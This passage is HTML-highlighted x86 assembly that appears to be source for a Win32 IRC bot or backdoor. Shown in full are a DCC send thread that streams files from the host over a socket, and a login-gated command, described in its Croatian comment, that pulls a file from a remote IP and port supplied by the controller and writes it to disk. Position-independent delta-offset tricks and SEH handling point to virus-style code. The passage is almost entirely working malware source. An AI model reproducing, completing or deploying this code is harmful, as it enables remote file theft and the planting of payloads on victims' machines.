            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__dcc_close</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc5">x_stosd</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">DCC</span><span class="sc0"> </span><span class="sc5">SEND</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
        
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dcc_nick_file</span><span class="sc0">
            </span><span class="sc5">@endspc</span><span class="sc0">
</span><span class="sc5">__copy</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__copy</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">50</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_gethostname</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_gethostbyname</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">50</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_htonl</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">num2ascii</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">port</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">num2ascii</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">' '</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bytes_to_send</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">num2ascii</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0d01h</span><span class="sc0">
            </span><span class="sc6">stosw</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LF</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
    
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dcc_msg</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dcc_msg</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">IRC_LOG</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">bot_log_handle</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_WriteFile</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0"> </span><span class="sc1">; IRC_LOG</span><span class="sc0">
            </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">(</span><span class="sc5">socket_handle</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc4">)</span><span class="sc5">.dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_send</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__dcc_close</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__dcc_close</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ssocket</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_listen</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__dcc_close</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ssocket</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">40</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            
            </span><span class="sc6">cdq</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_select</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">__dcc_close</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__dcc_close</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ssocket</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_accept</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ssocket</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_closesocket</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

</span><span class="sc5">__cycle</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">f_handle</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ReadFile</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ssocket</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_send</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__blocking_check</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cycle</span><span class="sc0">

            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">

</span><span class="sc5">__blocking_check</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_WSAGetLastError</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">WSAEWOULDBLOCK</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cycle</span><span class="sc0">
    
</span><span class="sc5">__dcc_close</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
</span><span class="sc5">__sleep</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__end</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">100</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_Sleep</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__sleep</span><span class="sc0"> 

</span><span class="sc5">__end</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ssocket</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_closesocket</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">f_handle</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_CloseHandle</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">
            
</span><span class="sc5">__end_dcc</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dcc_msg</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">free</span><span class="sc0">
            
            </span><span class="sc6">leave</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_ExitThread</span><span class="sc0"> </span><span class="sc5">_ST</span><span class="sc0">

</span><span class="sc5">bot_sending_thread</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; automatski prima fajl od ulogiranog nicka</span><span class="sc0">
</span><span class="sc1">; i: nothing</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; o: error ? ecx=0 : ecx!=0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">bot_recv_cmd</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_logged_in</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">err_not_logged_in</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc5">@endspc</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ascii2num</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dcc_recv_IP</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ascii2num</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dcc_recv_port</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ascii2num</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dcc_recv_size</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">GENERIC_WRITE</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CreateFileA</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__err</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; param             </span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">bot_receiving_thread</span><span class="sc0"> </span><span class="sc5">X</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2000h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CreateThread</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callb</span><span class="sc0">   </span><span class="sc5">CloseHandle</span><span class="sc0">

</span><span class="sc5">__err</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc5">@retecx1</span><span class="sc0">

</span><span class="sc5">bot_receiving_thread</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">pascal</span><span class="sc0">

            </span><span class="sc5">arg</span><span class="sc0"> </span><span class="sc5">file_handle</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

            </span><span class="sc9">local</span><span class="sc0">   </span><span class="sc5">rsocket</span><span class="sc0">
            
            </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">err_shit_recv_thread</span><span class="sc4">&gt;</span><span class="sc0">
            
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">dccrdlta</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            
</span><span class="sc5">_DR</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;-</span><span class="sc5">dccrdlta</span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]&gt;</span><span class="sc0">
            
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">PCL_NONE</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SOCK_STREAM</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">AF_INET</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_socket</span><span class="sc0"> </span><span class="sc5">_DR</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">err_shit_recv_thread</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">rsocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">068h</span><span class="sc0">
</span><span class="sc5">dcc_recv_IP</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_htonl</span><span class="sc0"> </span><span class="sc5">_DR</span><span class="sc0">

            </span><span class="sc6">cdq</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; sin_zero[8]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; sin_addr</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">068h</span><span class="sc0">
</span><span class="sc5">dcc_recv_port</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_htons</span><span class="sc0"> </span><span class="sc5">_DR</span><span class="sc0">
            </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">AF_INET</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">type</span><span class="sc0"> </span><span class="sc5">sockaddr_in</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">rsocket</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_connect</span><span class="sc0"> </span><span class="sc5">_DR</span><span class="sc0">

            </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">                         </span><span class="sc1">; free sockaddr</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">err_shit_recv_thread</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            
</span><span class="sc5">__cycle</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">rsocket</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">_recv</span><span class="sc0"> </span><span class="sc5">_DR</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">err_shit_recv_thread</span><span class="sc0">
